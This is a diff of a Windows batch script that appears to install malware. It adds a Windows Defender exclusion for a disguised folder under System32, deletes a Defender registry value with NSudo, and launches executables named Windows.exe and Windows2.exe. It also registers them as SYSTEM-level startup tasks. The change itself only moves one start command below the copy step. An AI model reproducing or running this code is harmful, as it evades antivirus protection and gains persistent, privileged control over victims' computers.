@@ -26,9 +26,9 @@ move "%appdata%\update.bat" "%systemroot%\System32\Windowsexe"
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%systemroot%\System32\Windowsexe'"
 NSudo -U:T -ShowWindowMode:Hide reg del "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /f
 start "Windows.exe" "%systemroot%\System32\Windowsexe\Windows.exe"
-start "Windows2.exe" "%systemroot%\System32\Windowsexe\Windows2.exe"
 move "AV.bat" "%systemroot%\System32\Windowsexe\AV.bat"
 copy "%systemroot%\System32\Windowsexe\Windows.exe" "%systemroot%\System32\Windowsexe\Windows2.exe"
+start "Windows2.exe" "%systemroot%\System32\Windowsexe\Windows2.exe"
 powershell -inputformat none -outputformat none -NonInteractive -Command "Remove-MpPreference -ExclusionPath '"%~dp0'"
 SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows.exe" /TN "Windows.exe" /RL HIGHEST /RU SYSTEM
 SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows2.exe" /TN "Windows2.exe"
